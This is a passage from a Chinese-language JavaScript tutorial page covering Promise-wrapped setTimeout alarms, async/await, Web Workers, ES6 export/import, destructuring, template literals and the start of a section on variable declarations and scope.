class="hljs-string">&quot;set-alarm&quot;</span>&gt;</span>Set alarm<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="用setTimeout-包裹"><a href="#用setTimeout-包裹" class="headerlink" title="用setTimeout()包裹"></a>用setTimeout()包裹</h3><p>使用setTimeout来实现alarm()函数。setTimeout() 以一个回调函数和一个以毫秒为单位的延迟作为参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> output = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#output&quot;</span>);<br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#set-alarm&quot;</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setAlarm</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span>&#123;<br>    output.<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;Wake up!&quot;</span>;<br>  &#125;,<span class="hljs-number">1000</span>)<br>&#125;<br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>,setAlarm);<br></code></pre></td></tr></table></figure><h3 id="Promise-构造器"><a href="#Promise-构造器" class="headerlink" title="Promise()构造器"></a>Promise()构造器</h3><p>alarm() 函数返回一个在定时器过期时才会被兑现的 Promise。它将会传递一个 “Wake up!” 消息到 then() 处理器中，也会在当调用者提供一个负延迟值时拒绝这个 promise。</p><p>如果异步函数成功了，就调用 resolve，如果失败了，就调用 reject。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">alarm</span>(<span class="hljs-params">person, delay</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Alarm delay must not be negative&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`Wake up, <span class="hljs-subst">$&#123;person&#125;</span>!`</span>);<br>    &#125;, delay);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>此函数创建并且返回一个新的 <code>Promise</code>。对于执行器中的 promise，我们：</p><ul><li>检查 <code>delay</code>（延迟）是否为负数，如果是的话就抛出一个错误。</li><li>调用 <code>window.setTimeout()</code>，传递一个回调函数和 <code>delay</code>（延迟）。当计时器过期时回调会被调用，在回调函数内，我们调用了 <code>resolve</code>，并且传递了 <code>&quot;Wake up!&quot;</code> 消息。</li></ul><h3 id="使用alarm-API"><a href="#使用alarm-API" class="headerlink" title="使用alarm() API"></a>使用alarm() API</h3><p>在返回的promise中调用<code>then()</code> 和 <code>catch()</code> 来设置 promise 兑现和拒绝状态的处理器。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> name = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#name&quot;</span>);<br><span class="hljs-keyword">const</span> delay = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#delay&quot;</span>);<br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#set-alarm&quot;</span>);<br><span class="hljs-keyword">const</span> output = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#output&quot;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">alarm</span>(<span class="hljs-params">person, delay</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Alarm delay must not be negative&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`Wake up, <span class="hljs-subst">$&#123;person&#125;</span>!`</span>);<br>    &#125;, delay);<br>  &#125;);<br>&#125;<br><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">alarm</span>(name.<span class="hljs-property">value</span>, delay.<span class="hljs-property">value</span>)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> (output.<span class="hljs-property">textContent</span> = message))<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> (output.<span class="hljs-property">textContent</span> = <span class="hljs-string">`Couldn&#x27;t set alarm: <span class="hljs-subst">$&#123;error&#125;</span>`</span>));<br>&#125;);<br><br></code></pre></td></tr></table></figure><h3 id="在-alarm-API-上使用-async-和-await"><a href="#在-alarm-API-上使用-async-和-await" class="headerlink" title="在 alarm() API 上使用 async 和 await"></a>在 alarm() API 上使用 async 和 await</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> name = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#name&quot;</span>);<br><span class="hljs-keyword">const</span> delay = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#delay&quot;</span>);<br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#set-alarm&quot;</span>);<br><span class="hljs-keyword">const</span> output = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#output&quot;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">alarm</span>(<span class="hljs-params">person, delay</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Alarm delay must not be negative&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`Wake up, <span class="hljs-subst">$&#123;person&#125;</span>!`</span>);<br>    &#125;, delay);<br>  &#125;);<br>&#125;<br><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> message = <span class="hljs-keyword">await</span> <span class="hljs-title function_">alarm</span>(name.<span class="hljs-property">value</span>, delay.<span class="hljs-property">value</span>);<br>    output.<span class="hljs-property">textContent</span> = message;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    output.<span class="hljs-property">textContent</span> = <span class="hljs-string">`Couldn&#x27;t set alarm: <span class="hljs-subst">$&#123;error&#125;</span>`</span>;<br>  &#125;<br>&#125;);<br><br></code></pre></td></tr></table></figure><h2 id="10-Workers"><a href="#10-Workers" class="headerlink" title="10.Workers"></a>10.Workers</h2><blockquote><p><strong>Web Worker</strong> 使得在一个独立于 Web 应用程序主执行线程的后台线程中运行脚本操作成为可能。</p><p>这样做的好处是可以在独立线程中执行费时的处理任务，使主线程（通常是 UI 线程）的运行不会被阻塞&#x2F;放慢。</p></blockquote><p>Worker给予了在不同线程中运行某些任务的能力。因此你可以启动任务，然后继续其他的处理（而不是因为单线程而等待它结束）。</p><p>但对于多线程，你永远不知道你的线程什么时候会被挂起，其他的线程将会得到运行的机会。若两个线程可以访问相同的变量，变量可能会发生非预期的改动，从而出现Bug。</p><p>为了避免这个问题，你的主代码和你的 worker 代码永远不能直接访问彼此的变量。<strong>Workers 和主代码运行在完全分离的环境中，只有通过相互发送消息来进行交互</strong>。特别是，这意味着 workers 不能访问 DOM（窗口、文档、页面元素等等）。</p><p>有三种不同类型的 workers：</p><ul><li><strong>dedicated workers</strong></li><li><strong>shared workers</strong></li><li><strong>service workers</strong></li></ul><h2 id="练习：序列动画"><a href="#练习：序列动画" class="headerlink" title="练习：序列动画"></a>练习：序列动画</h2><h1 id="ES6新特性"><a href="#ES6新特性" class="headerlink" title="ES6新特性"></a>ES6新特性</h1><ul><li><p><strong>let</strong></p></li><li><p><strong>解构赋值</strong></p></li><li><p><strong>简写</strong></p><p>xxx:function()可简写为xxx()</p><p>a:a,b:b可简写为a,b</p></li><li><p><strong>Class</strong>,<strong>getter</strong>,<strong>setter</strong></p></li><li><p><strong>export、import</strong></p></li><li><p><strong>Promise</strong></p></li></ul><h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><p>过去的js没有模块体系，无法将大程序拆分成小文件，再简单拼接。</p><p>ES6实现了模块功能，设计思想是尽量静态化，使编译时就能确定模块的依赖关系，以及输入输出的变量。</p><p>ES6的模块<strong>自动采用严格模式</strong>。</p><p>模块功能主要由<code>export</code>和<code>import</code>构成。</p><ul><li><strong>export</strong>：规定模块的对外接口</li><li><strong>import</strong>：输入其他模块提供的功能</li></ul><p>模块之间可继承。</p><h3 id="export"><a href="#export" class="headerlink" title="export"></a>export</h3><p>在创建 JavaScript 模块时，export 语句用于从模块中**<u>导出</u>实时绑定**的函数、对象或原始值，以便其他程序可以通过 import 语句使用它们。</p><p>如果你希望外部能够读取模块内部的某个变量，就必须使用<code>export</code>关键字输出该变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// profile.js</span><br><span class="hljs-comment">//输出变量</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">var</span> firstName = <span class="hljs-string">&#x27;Michael&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">var</span> lastName = <span class="hljs-string">&#x27;Jackson&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">var</span> year = <span class="hljs-number">1958</span>;<br><span class="hljs-comment">//也可以</span><br><span class="hljs-keyword">var</span> firstName = <span class="hljs-string">&#x27;Michael&#x27;</span>;<br><span class="hljs-keyword">var</span> lastName = <span class="hljs-string">&#x27;Jackson&#x27;</span>;<br><span class="hljs-keyword">var</span> year = <span class="hljs-number">1958</span>;<br><span class="hljs-keyword">export</span> &#123; firstName, lastName, year &#125;;<br><br><span class="hljs-comment">//输出函数和类</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">x, y</span>) &#123;<br>  <span class="hljs-keyword">return</span> x * y;<br>&#125;;<br><br><span class="hljs-comment">//可使用ad关键字重命名</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">v1</span>(<span class="hljs-params"></span>) &#123; ... &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">v2</span>(<span class="hljs-params"></span>) &#123; ... &#125;<br><br><span class="hljs-keyword">export</span> &#123;<br>  v1 <span class="hljs-keyword">as</span> streamV1,<br>  v2 <span class="hljs-keyword">as</span> streamV2,<br>  v2 <span class="hljs-keyword">as</span> streamLatestVersion<br>&#125;;<br><br><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">x, y</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-comment">//也可以</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">x, y</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><span class="hljs-keyword">export</span> &#123; add &#125;;<br></code></pre></td></tr></table></figure><p>由于<code>export</code>命令规定的是对外的接口，必须与模块内部的<strong>变量</strong>建立一一对应关系（不能是值）。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 报错，不能直接对应一个值</span><br><span class="hljs-keyword">export</span> <span class="hljs-number">1</span>;<br><span class="hljs-comment">//正确写法</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">var</span> n = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 报错</span><br><span class="hljs-keyword">var</span> m = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">export</span> m;<br><span class="hljs-comment">//正确写法</span><br><span class="hljs-keyword">export</span> &#123;m&#125;;<br><span class="hljs-comment">//或者</span><br><span class="hljs-keyword">export</span> &#123;a <span class="hljs-keyword">as</span> m&#125;<br><br><span class="hljs-comment">// 报错</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">export</span> f;<br><span class="hljs-comment">// 正确写法</span><br><span class="hljs-keyword">export</span> &#123;f&#125;;<br><br><span class="hljs-comment">//或者</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p><strong><code>export default</code><strong>可以为模块指定</strong>默认输出</strong>。该命令可以用在匿名函数前。</p><p>一个模块只能有一个默认输出（也就是该名令只能使用一次）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>) &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><span class="hljs-comment">//匿名</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-comment">//import,无需使用&#123;&#125;</span><br><span class="hljs-keyword">import</span> add <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./math_functions.js&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>静态的<code>import</code> 语句用于<strong>导入</strong>由另一个模块导出的绑定。使用export命令定义了模块对外接口以后，其他的js文件就可以通过<code>import</code>加载这个模块。</p><p>无论是否声明了 strict mode （严格模式），导入的模块都运行在严格模式下。</p><p>在浏览器中，import 语句只能在声明了 type&#x3D;”module” 的 script 的标签中使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// main.js</span><br><span class="hljs-keyword">import</span> &#123; firstName, lastName, year &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./profile.js&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params">element</span>) &#123;<br>  element.<span class="hljs-property">textContent</span> = firstName + <span class="hljs-string">&#x27; &#x27;</span> + lastName;<br>&#125;<br></code></pre></td></tr></table></figure><p>import命令输入的<strong>变量都是只读的</strong>，因为它的本质是输入接口。</p><p>但输入的若是一个对象，对象内的属性是可更改的（但不建议）。</p><p>由于<code>import</code>是静态执行，所以<strong>不能使用表达式和变量</strong>。</p><p><strong><code>Import * as</code></strong> 导入所有。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> myMathModule <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./math_functions.js&quot;</span>;<br>myMathModule.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>myMathModule.<span class="hljs-title function_">subtract</span>(<span class="hljs-number">5</span>,<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h3 id="export和import的复合写法"><a href="#export和import的复合写法" class="headerlink" title="export和import的复合写法"></a>export和import的复合写法</h3><p>如果在一个模块之中，先输入后输出同一个模块，<code>import</code>语句可以与<code>export</code>语句写在一起。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> &#123; foo, bar &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;my_module&#x27;</span>;<br><br><span class="hljs-comment">// 可以简单理解为</span><br><span class="hljs-keyword">import</span> &#123; foo, bar &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;my_module&#x27;</span>;<br><span class="hljs-keyword">export</span> &#123; foo, bar &#125;;<br><br><span class="hljs-comment">//默认接口的写法</span><br><span class="hljs-keyword">export</span> &#123; <span class="hljs-keyword">default</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;foo&#x27;</span>;<br><span class="hljs-keyword">export</span> &#123; es6 <span class="hljs-keyword">as</span> <span class="hljs-keyword">default</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./someModule&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="Destructuring-assignment解构赋值"><a href="#Destructuring-assignment解构赋值" class="headerlink" title="Destructuring assignment解构赋值"></a><strong>Destructuring assignment解构赋值</strong></h2><p>将数组中的值或对象的属性取出，赋值给其他变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> [a, b,,,c] = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>,];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<span class="hljs-comment">// 10</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);<span class="hljs-comment">// 20</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c);<span class="hljs-comment">// 50</span><br><span class="hljs-keyword">const</span> [d,e,...arr] = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [3,4,5,6,7]</span><br></code></pre></td></tr></table></figure><p>用于在对象上直接取值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John Doe&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span> &#125;;<br><br><span class="hljs-keyword">const</span> name = user.<span class="hljs-property">name</span>;<br><span class="hljs-keyword">const</span> age = user.<span class="hljs-property">age</span>; <br><span class="hljs-comment">//Destructuring assignment可以直接写成一句话</span><br><span class="hljs-keyword">const</span> &#123; name, age &#125; = user;<br><br>name <span class="hljs-comment">//John Doe</span><br>age <span class="hljs-comment">//34</span><br></code></pre></td></tr></table></figure><p>解构赋值允许赋予新的变量名（如下）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">name</span>: userName, <span class="hljs-attr">age</span>: userAge &#125; = user;<br>userName <span class="hljs-comment">//John Doe</span><br>userAge <span class="hljs-comment">//34</span><br></code></pre></td></tr></table></figure><p>也可配合箭头函数使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> stats = &#123;<br>  <span class="hljs-attr">max</span>: <span class="hljs-number">56.78</span>,<br>  <span class="hljs-attr">standard_deviation</span>: <span class="hljs-number">4.34</span>,<br>  <span class="hljs-attr">median</span>: <span class="hljs-number">34.54</span>,<br>  <span class="hljs-attr">mode</span>: <span class="hljs-number">23.87</span>,<br>  <span class="hljs-attr">min</span>: -<span class="hljs-number">0.75</span>,<br>  <span class="hljs-attr">average</span>: <span class="hljs-number">35.85</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">half2</span> = (<span class="hljs-params">stats</span>) =&gt; (stats.<span class="hljs-property">max</span> + stats.<span class="hljs-property">min</span>) / <span class="hljs-number">2.0</span>; <br><span class="hljs-comment">//等同于</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">half</span> = (<span class="hljs-params">&#123;max,min&#125;</span>) =&gt;&#123;<br>  <span class="hljs-keyword">return</span> (max+min)/<span class="hljs-number">2.0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Template-Literals-模板字面量"><a href="#Template-Literals-模板字面量" class="headerlink" title="Template Literals 模板字面量"></a>Template Literals 模板字面量</h2><blockquote><p>模板字面量是用<strong>反引号（&#96;）</strong>分隔的字面量，允许多行字符串、带嵌入表达式的字符串插值和一种叫带标签的模板的特殊结构。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Zodiac Hasbro&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">56</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> greeting = <span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;person.name&#125;</span>!</span><br><span class="hljs-string">I am <span class="hljs-subst">$&#123;person.age&#125;</span> years old.`</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(greeting);<br><br></code></pre></td></tr></table></figure><p>输出：</p><p>Hello, my name is Zodiac Hasbro!<br>I am 56 years old.</p><div id="start"></div><h1 id="JS指南"><a href="#JS指南" class="headerlink" title="JS指南"></a>JS指南</h1><h2 id="1-1语法和数据类型"><a href="#1-1语法和数据类型" class="headerlink" title="1.1语法和数据类型"></a>1.1语法和数据类型</h2><blockquote><p>JavaScript 的基本语法、变量声明、数据类型和字面量（literal）</p></blockquote><p>JavaScript<strong>区分大小写</strong>，并使用<strong>Unicode字符集</strong>。</p><p>指令被称为语句，用<code>;</code>分隔。</p><p>单行注释：<code>//</code>，多行注释：<code>/* */</code>。</p><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>JavaScript有<strong>三种声明方式</strong>：</p><ul><li><strong>var</strong>：声明一个<strong>变量</strong></li><li><strong>let</strong>：声明一个块作用域的<strong>局部变量</strong></li><li><strong>const</strong>：声明一个块作用域的<strong>只读常量</strong><ul><li>只能防止变量标识符的重新赋值（例如const声明的数组内的元素可变）</li></ul></li></ul><p>若声明时未赋值，则其值为<strong>undefined</strong>。</p><p>在 <em>数值类型环境</em> 中，undefined会转换为<strong>NaN</strong>，而null会被当成0（在布尔环境下被当成false）。</p><p>访问未声明的变量会抛出ReferenceError异常。</p><p>变量名应当使用<u>拉丁字符 (0-9,a-z,A-Z) 和下划线字符</u>。</p><ul><li>变量名大小写敏感</li><li>变量名不能以数字开头（以字母、下划线（_）或美元符号（$）开头）</li><li>变量名避免使用js的保留字（如var、function、let、for等）</li></ul><p>变量的作用域：全局变量、局部变量</p><ul><li><p>在<strong>函数之外</strong>声明的变量——<strong>全局变量</strong>。可被文档任何其他代码访问。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = <span class="hljs-number">5</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 5</span><br></code></pre></td></tr></table></figure><p>在网页中，全局对象是<u>window</u><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="window对象表示 